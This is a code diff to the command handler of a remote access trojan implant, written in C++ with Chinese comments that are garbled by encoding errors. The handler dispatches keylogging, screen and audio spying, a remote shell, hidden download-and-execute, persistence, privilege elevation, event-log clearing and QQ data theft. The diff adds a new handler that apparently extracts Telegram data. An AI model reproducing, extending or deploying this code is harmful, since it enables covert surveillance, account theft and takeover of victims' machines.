@@ -1,4 +1,4 @@
-ï»¿// KernelManager.cpp: implementation of the CKernelManager class.
+// KernelManager.cpp: implementation of the CKernelManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -8,7 +8,7 @@
 #include "until.h"
 #include <Shlwapi.h> // SHDeleteKey
 #include "../driver/QAssist.h"
-#include "../Myfunction.h"  //è‡ªå®šä¹‰å‡½æ•°
+#include "../Myfunction.h"  //×Ô¶¨Òåº¯Êı
 
 //////////////////////////////////////////////////////////////////////
 extern BOOL DeleteMe();
@@ -36,11 +36,11 @@ CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszMasterHost,UIN
 	hNewThreadInitializedEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
 	m_nMasterPort = nMasterPort;
 	m_nThreadCount = 0;
-	// åˆæ¬¡è¿æ¥ï¼Œæ§åˆ¶ç«¯å‘é€å‘½ä»¤è¡¨ç¤ºæ¿€æ´»
+	// ³õ´ÎÁ¬½Ó£¬¿ØÖÆ¶Ë·¢ËÍÃüÁî±íÊ¾¼¤»î
 	m_bIsActived = FALSE;
 }
 
-//ç­›é€‰è¿”å›æ•°æ®
+//É¸Ñ¡·µ»ØÊı¾İ
 void CKernelManager::SortProce(BOOL Strp)
 {
 	if (Strp)
@@ -64,7 +64,7 @@ CKernelManager::~CKernelManager()
 	}
 }
 
-// åŠ ä¸Šæ¿€æ´»
+// ¼ÓÉÏ¼¤»î
 void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	switch (lpBuffer[0])
@@ -72,96 +72,100 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_ACTIVED:
 		InterlockedExchange((LONG *)&m_bIsActived, TRUE);
 		break;
-	case COMMAND_DLLMAIN:          // è§†é¢‘æ’ä»¶
+	case COMMAND_DLLMAIN:          // ÊÓÆµ²å¼ş
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DllManager,
 			(lpBuffer + 1), 0, NULL);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
 		break;
-	case COMMAND_LIST_DRIVE:       // æ–‡ä»¶ç®¡ç†
+	case COMMAND_LIST_DRIVE:       // ÎÄ¼ş¹ÜÀí
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 		break;
-	case COMMAND_SCREEN_SPY:       // å±å¹•æŸ¥çœ‹
+	case COMMAND_SCREEN_SPY:       // ÆÁÄ»²é¿´
  		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
  			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
-	case COMMAND_SYSINFO:          // ä¸»æœºç®¡ç†
+	case COMMAND_SYSINFO:          // Ö÷»ú¹ÜÀí
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_AUDIO:            // éŸ³é¢‘ç›‘å¬
+	case COMMAND_AUDIO:            // ÒôÆµ¼àÌı
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SHELL:            // è¿œç¨‹ç»ˆç«¯
+	case COMMAND_TELEGRAM:            // ÌáÈ¡ T G
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_TelegramManager,
+			(LPVOID)m_pClient->m_Socket, 0, NULL);
+		break;
+	case COMMAND_SHELL:            // Ô¶³ÌÖÕ¶Ë
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
-	case COMMAND_KEYBOARD: //é”®ç›˜è®°å½•	
+	case COMMAND_KEYBOARD: //¼üÅÌ¼ÇÂ¼	
 		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//é€šçŸ¥æ‰“å¼€é”®ç›˜è®°å½•çª—å£
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//Í¨Öª´ò¿ª¼üÅÌ¼ÇÂ¼´°¿Ú
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		Sleep(10);		
 		break;
-	case COMMAND_SYSTEM:           // ç³»ç»Ÿç®¡ç†ï¼ŒåŒ…æ‹¬è¿›ç¨‹ï¼Œçª—å£
+	case COMMAND_SYSTEM:           // ÏµÍ³¹ÜÀí£¬°üÀ¨½ø³Ì£¬´°¿Ú
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_REGEDIT:          // æ³¨å†Œè¡¨ç®¡ç†
+	case COMMAND_REGEDIT:          // ×¢²á±í¹ÜÀí
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SERMANAGER:       // æœåŠ¡ç®¡ç†
+	case COMMAND_SERMANAGER:       // ·şÎñ¹ÜÀí
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_CHAT:             // è¿œç¨‹äº¤è°ˆ
+	case COMMAND_CHAT:             // Ô¶³Ì½»Ì¸
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_QQINFO:           // å¥½å‹ä¿¡æ¯
+	case COMMAND_QQINFO:           // ºÃÓÑĞÅÏ¢
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_QQInfoManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_DOWN_EXEC:        // è¿œç¨‹ä¸‹è½½
+	case COMMAND_DOWN_EXEC:        // Ô¶³ÌÏÂÔØ
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
 		break;
-	case COMMAND_SENDFILE_HIDE:    // éšè—è¿è¡Œ
+	case COMMAND_SENDFILE_HIDE:    // Òş²ØÔËĞĞ
 		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_HIDE);
 		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
 		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
 		break;
-	case COMMAND_SENDFILE_SHOW:    // æ˜¾ç¤ºè¿è¡Œ
+	case COMMAND_SENDFILE_SHOW:    // ÏÔÊ¾ÔËĞĞ
 		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_SHOW);
 		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
 		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
 		break;
-	case COMMAND_SENDFILE_NRUN:    // å¦‚æœæ’ä»¶æ— æ³•ä¸Šä¼ æ‰‹åŠ¨ä¸Šä¼ dll
+	case COMMAND_SENDFILE_NRUN:    // Èç¹û²å¼şÎŞ·¨ÉÏ´«ÊÖ¶¯ÉÏ´«dll
 		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, -1);
 		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
 		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
 		break;
-	case COMMAND_OPEN_URL_SHOW:    // æ˜¾ç¤ºæ‰“å¼€ç½‘é¡µ
+	case COMMAND_OPEN_URL_SHOW:    // ÏÔÊ¾´ò¿ªÍøÒ³
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenUrlShow,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
 		break;
-	case COMMAND_OPEN_URL_HIDE:    // éšè—æ‰“å¼€ç½‘é¡µ
+	case COMMAND_OPEN_URL_HIDE:    // Òş²Ø´ò¿ªÍøÒ³
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenUrlHide,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
 		break;
-	case COMMAND_START:         //å†™å…¥å¯åŠ¨
+	case COMMAND_START:         //Ğ´ÈëÆô¶¯
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Start,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		break;
-	case COMMAND_Screensp:            //WIN10åŠå±
+	case COMMAND_Screensp:            //WIN10°ëÆÁ
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Screen,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_SHOW_MSG:         // å‘é€ä¿¡æ¯
+	case COMMAND_SHOW_MSG:         // ·¢ËÍĞÅÏ¢
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_MessageBox,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
@@ -170,44 +174,44 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProxyManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;	
-	case COMMAND_OnElevate_Privileges://WIN7æå‡æƒé™
+	case COMMAND_OnElevate_Privileges://WIN7ÌáÉıÈ¨ÏŞ
 		CreateThread(NULL, 0,Win7Elevate_Privileges,NULL, 0, NULL);
 		//Win7Elevate_Privileges();
 		break;
-	case COMMAND_ReStart_Exp: // é‡å¯Exp
+	case COMMAND_ReStart_Exp: // ÖØÆôExp
 		CreateThread(NULL, 0,ReStartExp,NULL, 0, NULL);
 		//ReStartExp();
 		break;
 	case COMMAND_ReStart_ieqc:
 		CreateThread(NULL, 0,ReStartieqc,NULL, 0, NULL);
 		break;
-	case COMMAND_RESTART:          // é‡å¯è‡ªèº«
+	case COMMAND_RESTART:          // ÖØÆô×ÔÉí
 		ReStartServer();
 		break;
-	case COMMAND_REMOVE:           // å¸è½½è‡ªèº«
+	case COMMAND_REMOVE:           // Ğ¶ÔØ×ÔÉí
 		UnInstallServer();
 		break;
-	case COMMAND_CLEAN_EVENT:      // æ¸…é™¤æ—¥å¿—
+	case COMMAND_CLEAN_EVENT:      // Çå³ıÈÕÖ¾
 		CleanEvent();
 		break;
-	case COMMAND_SESSION:          // ä¼šè¯ç®¡ç†
+	case COMMAND_SESSION:          // »á»°¹ÜÀí
         ShutdownWindows(lpBuffer[1]);
 		break;
-	case COMMAND_RENAME_REMARK:    // æ›´æ”¹å¤‡æ³¨
+	case COMMAND_RENAME_REMARK:    // ¸ü¸Ä±¸×¢
 		SetHostID((LPCTSTR)(lpBuffer + 1));
 		break;
-	case COMMAND_CHANGE_GROUP:     // æ›´æ”¹åˆ†ç»„
+	case COMMAND_CHANGE_GROUP:     // ¸ü¸Ä·Ö×é
 		SetInfo(modify_data.szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
 		break;
-	case COMMAND_SORT_PROCESS:     // è¿›ç¨‹ç­›é€‰
+	case COMMAND_SORT_PROCESS:     // ½ø³ÌÉ¸Ñ¡
 		Loop_SortProcess(lpBuffer + 1);
 		SortProce(SortUOP);
 		break;
-	case COMMAND_SORT_WINDOW:      // çª—ä½“ç­›é€‰
+	case COMMAND_SORT_WINDOW:      // ´°ÌåÉ¸Ñ¡
 		Loop_SortWindow(lpBuffer + 1);
 		SortProce(SortUOP);
 		break;
-// 	case COMMAND_DLLCONTROL_GRADE: // æ§ä»¶å‡çº§
+// 	case COMMAND_DLLCONTROL_GRADE: // ¿Ø¼şÉı¼¶
 // 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DllControlupgrade,
 // 			(LPVOID)(lpBuffer + 1), 0, NULL);
 // 		break;
@@ -216,7 +220,7 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			(LPVOID)lpBuffer[1], 0, NULL, true);
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);;
 		break;
-	case COMMAND_REPLAY_HEARTBEAT: // å›å¤å¿ƒè·³åŒ…
+	case COMMAND_REPLAY_HEARTBEAT: // »Ø¸´ĞÄÌø°ü
 	//	InterlockedExchange((LONG *)&m_bIsActived, TRUE);
 		m_pClient->nHeartBeatCount++;
 		break;
@@ -236,7 +240,7 @@ BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowC
 	char strExePath[MAX_PATH], strRand[100];
 	pGetTempPathA(sizeof(strExePath), strExePath);
 	
-	if (nShowCmd == -1)  //ä¸å»è¿è¡Œ
+	if (nShowCmd == -1)  //²»È¥ÔËĞĞ
 	{
 	    char UtKoF22[] = {'P','l','u','g','i','n','3','2','.','d','l','l','\0'};
      	sprintf(strRand, UtKoF22, GetTickCount());
@@ -249,13 +253,13 @@ BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowC
 	lstrcat(strExePath, strRand);
 	
 	HANDLE hFile=pCreateFileA(strExePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
-	if (hFile == INVALID_HANDLE_VALUE) // é”™è¯¯å¤„ç†
+	if (hFile == INVALID_HANDLE_VALUE) // ´íÎó´¦Àí
 		return false;
 	DWORD dwBytesWrite;
-	WriteFile(hFile,(char *)filedata+strlen((char *)filedata)+1,size-strlen((char *)filedata)-1,&dwBytesWrite,NULL); // å†™å…¥æ–‡ä»¶
+	WriteFile(hFile,(char *)filedata+strlen((char *)filedata)+1,size-strlen((char *)filedata)-1,&dwBytesWrite,NULL); // Ğ´ÈëÎÄ¼ş
 	CloseHandle(hFile);
 	
-	if (nShowCmd == -1)  //ä¸å»è¿è¡Œ
+	if (nShowCmd == -1)  //²»È¥ÔËĞĞ
 		return false;
 	
 	char *lpExt = pMyfunction->my_strrchr(strExePath, '.');
@@ -263,15 +267,15 @@ BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowC
 		return false;
 	
 	//char BvtmX12[] = {'o','p','e','n','\0'};
-	if(GetFileAttributesA(strExePath) == -1)  //æ£€æŸ¥æ–‡ä»¶ä¸å­˜åœ¨
+	if(GetFileAttributesA(strExePath) == -1)  //¼ì²éÎÄ¼ş²»´æÔÚ
 	    return false;
 	return OpenFile1(strExePath, FALSE, nShowCmd);
-    //return ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,nShowCmd) > (HINSTANCE)32; //æ­£å¸¸è¿è¡Œç›®æ ‡æ–‡ä»¶
+    //return ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,nShowCmd) > (HINSTANCE)32; //Õı³£ÔËĞĞÄ¿±êÎÄ¼ş
 }
 
 void CKernelManager::ReStartServer()
 {
-	//ç»ˆæ­¢ç»ˆç«¯ç¨‹åº
+	//ÖÕÖ¹ÖÕ¶Ë³ÌĞò
 	std::map<DWORD, HANDLE>::iterator it;
 	DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
 	for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
@@ -301,7 +305,7 @@ void CKernelManager::ReStartServer()
 			Sleep(10);
 		TerminateProcess(it->second, 0);
 	}
-	//å½“è¿è¡ŒçŠ¶æ€æ˜¯æœåŠ¡æ—¶, ä¸èƒ½é‡å¯è¢«æ§ç«¯ç¨‹åº(ç›´æ¥è¿”å›)
+	//µ±ÔËĞĞ×´Ì¬ÊÇ·şÎñÊ±, ²»ÄÜÖØÆô±»¿Ø¶Ë³ÌĞò(Ö±½Ó·µ»Ø)
 	if (hServiceStatus != NULL)
 		return;
 	CloseHandle(g_hMutexEntry);
@@ -365,7 +369,7 @@ void CKernelManager::ReStartServer()
 
 void CKernelManager::UnInstallServer()
 {
-	//ç»ˆæ­¢ç»ˆç«¯ç¨‹åº
+	//ÖÕÖ¹ÖÕ¶Ë³ÌĞò
 	std::map<DWORD, HANDLE>::iterator it;
 	DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
 	for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
@@ -395,7 +399,7 @@ void CKernelManager::UnInstallServer()
 			Sleep(10);
 		TerminateProcess(it->second, 0);
 	}
-	//å¸è½½é©±åŠ¨ç¨‹åº
+	//Ğ¶ÔØÇı¶¯³ÌĞò
 	if (g_hidContext != NULL) Hid_Destroy(g_hidContext);
 	EnablePrivilege(SE_LOAD_DRIVER_NAME, TRUE);
 	RtlInitUnicodeStringT RtlInitUnicodeString = (RtlInitUnicodeStringT)MyGetProcAddressA("NTDLL.DLL", "RtlInitUnicodeString");
@@ -406,12 +410,12 @@ void CKernelManager::UnInstallServer()
 	RtlInitUnicodeString(&usDriverServiceName, szDriverServiceName);
 	ZwUnloadDriver(&usDriverServiceName);
 	EnablePrivilege(SE_LOAD_DRIVER_NAME, FALSE);
-	//åˆ é™¤é©±åŠ¨æœåŠ¡
+	//É¾³ıÇı¶¯·şÎñ
 	char szDriverServiceKey[256];
 	strcpy(szDriverServiceKey, "SYSTEM\\CurrentControlSet\\Services\\");
 	strcat(szDriverServiceKey, lpDriverName);
 	SHDeleteKey(HKEY_LOCAL_MACHINE, szDriverServiceKey);
-	//åˆ é™¤è‡ªèº«æœåŠ¡
+	//É¾³ı×ÔÉí·şÎñ
 	SC_HANDLE schManager = NULL, schService = NULL;
 	schManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);
 	if (schManager != NULL)
@@ -424,29 +428,29 @@ void CKernelManager::UnInstallServer()
 		}
 		CloseServiceHandle(schManager);
 	}
-	//æ¸…ç†å®‰è£…æ—¶é—´
+	//ÇåÀí°²×°Ê±¼ä
 	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\Select", "MarkTime", 0, NULL, 0, 3);
-	//æ¸…ç†å¤‡æ³¨ä¿¡æ¯
+	//ÇåÀí±¸×¢ĞÅÏ¢
 	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", "Host", 0, NULL, 0, 3);
-	//æ¸…ç†åˆ†ç»„ä¿¡æ¯
+	//ÇåÀí·Ö×éĞÅÏ¢
 	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\BITS", modify_data.szGetGroup, 0, NULL, 0, 3);
-	//åˆ é™¤è§†é¢‘æ’ä»¶
+	//É¾³ıÊÓÆµ²å¼ş
 	char szPluginFile[MAX_PATH];
 	char szPluginName[] = {'\\','b','P','l','u','g','i','n','V','i','d','e','o','.','d','l','l','\0'};
 	GetSystemDirectory(szPluginFile, sizeof(szPluginFile));
 	lstrcat(szPluginFile, szPluginName);
 	DeleteFile(szPluginFile);
-	//åˆ é™¤é”®ç›˜è®°å½•
+	//É¾³ı¼üÅÌ¼ÇÂ¼
 	char szRecordFile[MAX_PATH];
 	char szKeylogName[] = {'\\','m','l','o','g','s','.','d','a','t','\0'};
 	GetSystemDirectory(szRecordFile, sizeof(szRecordFile));
 	lstrcat(szRecordFile, szKeylogName);
 	DeleteFile(szRecordFile);
-	//æ¸…ç†ä¸€äº›å†…å­˜
+	//ÇåÀíÒ»Ğ©ÄÚ´æ
 	LocalFree(lpszUserSid);
 	free((void *)lpConnInfos[0]);
 	free((void *)lpConnInfos[1]);
-	//åˆ é™¤é©±åŠ¨æ–‡ä»¶
+	//É¾³ıÇı¶¯ÎÄ¼ş
 	char szDriverPath[MAX_PATH];
 	BOOL bIsWow64 = FALSE;
 	GetWindowsDirectory(szDriverPath, MAX_PATH);
@@ -462,7 +466,7 @@ void CKernelManager::UnInstallServer()
 		strcat(szDriverPath, ".sys");
 	}
 	DeleteFile(szDriverPath);
-	//åˆ é™¤ç¨‹åºè‡ªèº«
+	//É¾³ı³ÌĞò×ÔÉí
 	if (hServiceStatus != NULL)
 	{
 		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
